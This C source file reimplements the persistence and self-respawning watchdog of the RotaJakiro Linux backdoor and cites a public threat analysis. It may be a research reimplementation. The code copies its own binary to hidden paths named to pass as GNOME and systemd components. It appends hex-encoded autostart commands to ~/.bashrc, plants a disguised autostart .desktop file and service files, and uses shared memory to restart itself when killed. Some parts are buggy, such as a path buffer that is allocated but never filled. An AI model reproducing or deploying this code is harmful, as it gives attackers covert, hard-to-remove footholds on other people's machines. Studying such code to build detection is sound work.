#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <pthread.h>

// custom headers
#include "persistence.h"
#include "utils.h"

bool copy_rota_to_userland(char *destpath) {
    struct stat procstru;
    int fsize;

    // allocating file size to copy data to destination buffer.
    stat("/proc/self/exe", &procstru);
    fsize = procstru.st_size;
    char *exe = (char *)malloc(fsize);
    memset(exe,0, fsize);

    // copy data from /proc/self/exe into exe buffer.
    int fd  = open("/proc/self/exe", O_RDONLY);
    read(fd, exe, fsize);
    close(fd);

    // write binary to new location specified by destpath
    int fout  = open(destpath, O_CREAT|O_WRONLY, 0755);
    int bytesWritten = write(fout, exe, fsize);
    free(exe);

    // if bytes written == size of file
    if (bytesWritten == fsize) {
        return true;
    }

    return false;
}


bool nonroot_bashrc_persistence() {
    /**
    *
    * source: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
    *
    * # Add GNOME's helper designed to work with the I/O abstraction of GIO
    * # this environment variable is set, gvfsd will not start the fuse filesystem
    * if [ -d ${HOME} ]; then
    *     ${HOME}/.gvfsd/.profile/gvfsd-helper
    * fi
    *
    * */

    char bashrc_autostart [219] = {0x23,0x20,0x41,0x64,0x64,0x20,0x47,0x4e,0x4f,0x4d,0x45,0x27,0x73,0x20,0x68,0x65,0x6c,0x70,0x65,0x72,0x20,0x64,0x65,0x73,0x69,0x67,0x6e,0x65,0x64,0x20,0x74,0x6f,0x20,0x77,0x6f,0x72,0x6b,0x20,0x77,0x69,0x74,0x68,0x20,0x74,0x68,0x65,0x20,0x49,0x2f,0x4f,0x20,0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x69,0x6f,0x6e,0x20,0x6f,0x66,0x20,0x47,0x49,0x4f,0xa,0x23,0x20,0x74,0x68,0x69,0x73,0x20,0x65,0x6e,0x76,0x69,0x72,0x6f,0x6e,0x6d,0x65,0x6e,0x74,0x20,0x76,0x61,0x72,0x69,0x61,0x62,0x6c,0x65,0x20,0x69,0x73,0x20,0x73,0x65,0x74,0x2c,0x20,0x67,0x76,0x66,0x73,0x64,0x20,0x77,0x69,0x6c,0x6c,0x20,0x6e,0x6f,0x74,0x20,0x73,0x74,0x61,0x72,0x74,0x20,0x74,0x68,0x65,0x20,0x66,0x75,0x73,0x65,0x20,0x66,0x69,0x6c,0x65,0x73,0x79,0x73,0x74,0x65,0x6d,0xa,0x69,0x66,0x20,0x5b,0x20,0x2d,0x64,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x20,0x5d,0x3b,0x20,0x74,0x68,0x65,0x6e,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa,0x66,0x69,0xa};

    char *HOME = getenv("HOME");
    char *bashrc = "/.bashrc";
    int bytes_written;

    int fpath_size = strlen(HOME) + strlen(bashrc);
    char *fpath = (char *)malloc(fpath_size);
    memset(fpath, 0, fpath_size);
    strncat(fpath, HOME, strlen(HOME));
    strncat(fpath, bashrc, strlen(bashrc));

    // TODO: decrypt and rotate char array for stack string to then execute write_to_file
    int fd = open(fpath, O_CREAT| O_WRONLY| O_APPEND , 0755);
    if (fd < 0) {
        return false;
    }

    bytes_written = write(fd, bashrc_autostart, strlen(bashrc_autostart));
    if (bytes_written < 0) {
        fprintf(stderr, "\n[nonroot_bashrc_persistence]Error writing to bashrc: %s", strerror(errno));
    }

    close(fd);
    free(fpath);

    // bytes written == size of data to be written
    if (bytes_written == strlen(bashrc_autostart)) {
        return true;
    }
    return false;
}

bool nonroot_desktop_persistence() {
    /*
    * source: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
    * gnomehelper_desktop contains the following value:
    *
    * [Desktop Entry]
    * Type=Application
    * Exec=$HOME/.gvfsd/.profile/gvfsd-helper
    */
    char gnomehelper_desktop [73] = {0x5b,0x44,0x65,0x73,0x6b,0x74,0x6f,0x70,0x20,0x45,0x6e,0x74,0x72,0x79,0x5d,0xa,0x54,0x79,0x70,0x65,0x3d,0x41,0x70,0x70,0x6c,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0xa,0x45,0x78,0x65,0x63,0x3d,0x24,0x48,0x4f,0x4d,0x45,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa};


    char *HOME = getenv("HOME");
    char *gnomehelper_path = "/.config/au-tostart/gnomehelper.desktop";

    int fpath_size = strlen(HOME) + strlen(gnomehelper_path);
    char *fpath = (char *)malloc(fpath_size);
    memset(fpath, 0, fpath_size);
    strncat(fpath, HOME, strlen(HOME));
    strncat(fpath, gnomehelper_path, strlen(gnomehelper_path));

    // create dir in home directory
    char *audir = "/.config/au-tostart";
    int dirpath_size = strlen(HOME) + strlen(audir);
    char *dirpath = (char *)malloc(dirpath_size);
    memset(dirpath, 0, dirpath_size);

    strncat(dirpath, HOME, strlen(HOME));
    strncat(dirpath, audir, strlen(audir));
    if (access(dirpath, F_OK) == -1) {
        mkdir(dirpath, 0755);
    }

    // TODO: decrypt and rotate char array for stack string to then execute write_to_file
    bool result = write_to_file(fpath, gnomehelper_desktop);

    // -------- copy userland binary now -------------
    //
    // copy rota binary
    // TODO convert gvfsd_helper into char array
    // TODO decrypt and rotate char array below
    //
    char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
    fpath_size = strlen(HOME) + strlen(gvfsd_helper);
    char *binpath = (char *)malloc(fpath_size);
    memset(binpath, 0, fpath_size);
    strncat(binpath, HOME, strlen(HOME));
    strncat(binpath, gvfsd_helper, strlen(gvfsd_helper));

    // build string for userland file location.
    //char *gvfsd_profile= "/.gvfsd/.profile";
    char *gvfsd_profile= "/.gvfsd";
    dirpath_size = strlen(HOME) + strlen(gvfsd_profile);
    char *dirpath_profile = (char *)malloc(dirpath_size);
    memset(dirpath_profile, 0, dirpath_size);

    strncat(dirpath_profile, HOME, strlen(HOME));
    strncat(dirpath_profile, gvfsd_profile, strlen(gvfsd_profile));
    // if directory does not exist create it.
    if (access(dirpath_profile, F_OK) == -1) {
        int res = mkdir(dirpath_profile, 0755);
        if (res != 0) {
            fprintf(stderr, "\n[gvfsd]Error creating directory to %s.\tError: %s",
                dirpath_profile, strerror(errno));
        }

    }

    // creaking .profile within gvfsd
    char *profile_dir = "/.gvfsd/.profile";
    dirpath_size = strlen(HOME) + strlen(profile_dir);
    char *profilepath_profile = (char *)malloc(dirpath_size);
    memset(profilepath_profile, 0, dirpath_size);
    strncat(profilepath_profile, HOME, strlen(HOME));
    strncat(profilepath_profile, profile_dir, strlen(profile_dir));
    // if directory does not exist create it.
    if (access(profilepath_profile, F_OK) == -1) {
        int res = mkdir(profilepath_profile, 0755);
        if (res != 0) {
            fprintf(stderr, "\n[gvfsd/profile] Error creating directory to %s\tError: %s",
                dirpath_profile, strerror(errno));
        }
    }

    // write rota binary to persistence location.
    bool rota_write = copy_rota_to_userland(binpath);

    if (rota_write == false) {
        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
                binpath, strerror(errno));
    }


    free(fpath);
    free(binpath);
    return result;
}

bool nonroot_persistence(void) {
    // handy wraper funtion for non-root persistence.
    // note - this is not 1:1 with how the analyzed samples call persistence methods.
    nonroot_desktop_persistence();
    nonroot_bashrc_persistence();
    return true;
}


bool root_persistence(void) {

    bool result;
    char *fpath;

    // TODO - stack strings, encrypt+rotate
    char *init_path_1 = "/etc/init/systemd-agent.conf";
    char *systemd_path_1 = "/lib/systemd/system/sys-temd-agent.service";

    if (access("/run/systemd/system", F_OK)) { //systemd
        /*
        **
        * source: https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
        *
        * Content of systemd-agent.conf
        * -----------------------------
        * #system-daemon - configure for system daemon
        * #This service causes system have an associated
        * #kernel object to be started on boot.
        * description "system daemon"
        * start on filesystem or runlevel [2345]
        * exec /bin/systemd/systemd-daemon
        * respawn
        */
        char systemd_agent_conf [238] = {0x23,0x73,0x79,0x73,0x74,0x65,0x6d,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x20,0x2d,0x20,0x63,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x65,0x20,0x66,0x6f,0x72,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x23,0x54,0x68,0x69,0x73,0x20,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x20,0x63,0x61,0x75,0x73,0x65,0x73,0x20,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x68,0x61,0x76,0x65,0x20,0x61,0x6e,0x20,0x61,0x73,0x73,0x6f,0x63,0x69,0x61,0x74,0x65,0x64,0xa,0x23,0x6b,0x65,0x72,0x6e,0x65,0x6c,0x20,0x6f,0x62,0x6a,0x65,0x63,0x74,0x20,0x74,0x6f,0x20,0x62,0x65,0x20,0x73,0x74,0x61,0x72,0x74,0x65,0x64,0x20,0x6f,0x6e,0x20,0x62,0x6f,0x6f,0x74,0x2e,0xa,0x64,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x20,0x22,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x64,0x61,0x65,0x6d,0x6f,0x6e,0x22,0xa,0x73,0x74,0x61,0x72,0x74,0x20,0x6f,0x6e,0x20,0x66,0x69,0x6c,0x65,0x73,0x79,0x73,0x74,0x65,0x6d,0x20,0x6f,0x72,0x20,0x72,0x75,0x6e,0x6c,0x65,0x76,0x65,0x6c,0x20,0x5b,0x32,0x33,0x34,0x35,0x5d,0xa,0x65,0x78,0x65,0x63,0x20,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x72,0x65,0x73,0x70,0x61,0x77,0x6e,0xa};

        int fpath_size = strlen(systemd_path_1);
        fpath = (char *)malloc(fpath_size);
        memset(fpath,0, fpath_size);
        result = write_to_file(fpath, systemd_agent_conf);
        copy_rota_to_userland("/bin/systemd/systemd-daemon");

    } else { // non systemd system...
        /**
        *
        * source; https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
        * Content of systemd-agent.service
        * -----------------------------
        * [Unit]
        * Description=System Daemon
        * Wants=network-online.target
        * After=network-online.target
        * [Service]
        * ExecStart=/usr/lib/systemd/systemd-daemon
        * Restart=always
        * [Install]
        *
        * */
        char sys_temd_agent_service [166] = {0x5b,0x55,0x6e,0x69,0x74,0x5d,0xa,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x3d,0x53,0x79,0x73,0x74,0x65,0x6d,0x20,0x44,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x57,0x61,0x6e,0x74,0x73,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2d,0x6f,0x6e,0x6c,0x69,0x6e,0x65,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0xa,0x41,0x66,0x74,0x65,0x72,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2d,0x6f,0x6e,0x6c,0x69,0x6e,0x65,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0xa,0x5b,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x5d,0xa,0x45,0x78,0x65,0x63,0x53,0x74,0x61,0x72,0x74,0x3d,0x2f,0x75,0x73,0x72,0x2f,0x6c,0x69,0x62,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x52,0x65,0x73,0x74,0x61,0x72,0x74,0x3d,0x61,0x6c,0x77,0x61,0x79,0x73,0xa,0x5b,0x69,0x6e,0x73,0x74,0x61,0x6c,0x6c,0x5d,0xa};
        int fpath_size = strlen(init_path_1);
        fpath = (char *)malloc(fpath_size);
        memset(fpath,0, fpath_size);

        result = write_to_file(fpath, sys_temd_agent_service);
        copy_rota_to_userland("/usr/lib/systemd/systemd-daemon");
    }

    free(fpath);
    return result;
}


bool monitor_proc(char *pid) {

    char *procpath = "/proc/";

    int size_procpath = strlen(procpath) + strlen(pid);
    char *finalpath = (char *)malloc(size_procpath);
    memset(finalpath, 0, size_procpath);

    strncpy(finalpath, procpath, strlen(procpath));
    strncat(finalpath, pid, strlen(pid));
    // variable finalpath is now /proc/<PID>

    int res = access(finalpath, F_OK);
    //free(pid);
    free(finalpath);
    if (res == 0 ) {
        return true; // file exists
    } else {
        return false; // file does not exists, respawn program
    }
}

void fork_exec(char *fpath) {

    int wstatus;
    int res = fork();

    if (res < 0) {
        fprintf(stderr, "[fork_exec] error forking : %s",
                strerror(errno));
        exit(1);
    }
    if (res == 0){
        // child process to execvp;
        execvp(fpath, NULL);
    }

    waitpid(res, &wstatus, 0);

}


void *watchdog_process_shmget(void *fpath){

    bool proc_alive;
    int pid = getpid();
    char *c_pid = (char *)malloc(sizeof(int));
    memset(c_pid, 0, sizeof(int));
    sprintf(c_pid, "%d", pid);

    // obtain PID from shared memory
    int shmid = shmget(0x64b2e2, 8, IPC_CREAT |0666);
    if (shmid <= 0) {
        fprintf(stderr, "\n[wathcdog_process_shmget] Error getting shared memory : %s\n", strerror(errno));
        fork_exec(fpath);
    }

    // write PID to sharedmem
    void *addr = shmat(shmid, NULL, 0);
    memcpy(addr, c_pid, 8);
    sleep(10);
    // TODO - stackstring + AES + ROR here
    //
    do {

        //  check /proc/<PID> exists....
        // get pid from shared memory.
        char *shmem_pid_addr = shmat(shmid, NULL, 0);
        proc_alive = monitor_proc(shmem_pid_addr);

        //if proc not there, exec into existence
        if (proc_alive == false) {
            fprintf(stderr, "[shmget] process is not alive! spawning\n");
            fork_exec(fpath);
        }

        sleep(3);
    } while(true);

    if (fpath != NULL) {
        free(fpath);
    }

    // detatch from process
    pthread_detach(pthread_self());
}


void *watchdog_process_shmread(void *fpath) {

    bool proc_alive;

    do {
        int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
        if (shmid <= 0) {
            fprintf(stderr, "\n[wathcdog_process_shmread] %s\n", strerror(errno));
            fork_exec(fpath);
        }
        // get pid from shared memory.
        char *shmem_pid_addr = shmat(shmid, NULL, 0);
        proc_alive = monitor_proc(shmem_pid_addr);

        //if proc pid entry not there, exec into existence
        if (proc_alive == false) {
            fprintf(stderr, "[shmread] process is not alive! spawning\n");
            fork_exec(fpath);
        }
        // if process dies execute
        if (!access(fpath, F_OK)) {
            fork_exec(fpath);
        }

        sleep(3);
    } while(true);

    pthread_detach(pthread_self());
}


void spawn_thread_watchdog(int uid, char *fpath) {
    pthread_t threadid;
    if (uid == 0){
        // "the parent thread"
        pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
    } else {
        // "the child thread"
        pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
    }
}
